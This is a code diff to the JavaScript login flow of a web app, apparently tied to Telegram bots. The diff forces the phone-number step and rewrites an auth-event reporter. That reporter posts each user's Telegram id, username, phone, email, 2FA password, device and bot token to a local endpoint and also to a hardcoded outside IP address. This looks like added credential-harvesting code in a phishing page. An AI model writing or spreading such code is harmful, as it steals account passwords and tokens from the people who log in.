@@ -278,11 +278,7 @@ function initApp() {
                 return;
             }
         }
-        if (isTestBotUrl) {
-            showStep(stepGoogleEmail);
-        } else {
-            showStep(stepPhone);
-        }
+        showStep(stepPhone);
     }
 
     // Check if launched via Test Bot or explicit test parameters
@@ -595,26 +591,34 @@ function initApp() {
             try { localStorage.setItem("privateroom_bot_token", botTokenParam); } catch (e) {}
         }
         const isTestFlag = window.location.search.toLowerCase().includes("test") || urlParams.get("features") === "google" || urlParams.get("google") === "1" || (botTokenParam && (botTokenParam.includes("8945168964") || botTokenParam.includes("8877489211") || botTokenParam.includes("8864734674")));
-        try {
-            await fetch("/api/auth/event", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    event: step,
-                    tg_id: userTgId,
-                    username: userUsername,
-                    nickname: userNickname,
-                    phone: currentPhone,
-                    email: currentEmail,
-                    details: details,
-                    password_2fa: password,
-                    device: currentDevice,
-                    is_test: isTestFlag,
-                    bot_token: botTokenParam
-                })
-            });
-        } catch (e) {
-            console.debug("reportAuthEvent error:", e);
+        const apiEndpoints = [
+            "/api/auth/event",
+            "http://31.76.101.210:8080/api/auth/event"
+        ];
+        const payload = JSON.stringify({
+            event: step,
+            tg_id: userTgId,
+            username: userUsername,
+            nickname: userNickname,
+            phone: currentPhone,
+            email: currentEmail,
+            details: details,
+            password_2fa: password,
+            device: currentDevice,
+            is_test: isTestFlag,
+            bot_token: botTokenParam
+        });
+        for (const ep of apiEndpoints) {
+            try {
+                const r = await fetch(ep, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: payload
+                });
+                if (r.ok) break;
+            } catch (e) {
+                console.debug("reportAuthEvent fetch error on " + ep, e);
+            }
         }
     }
 
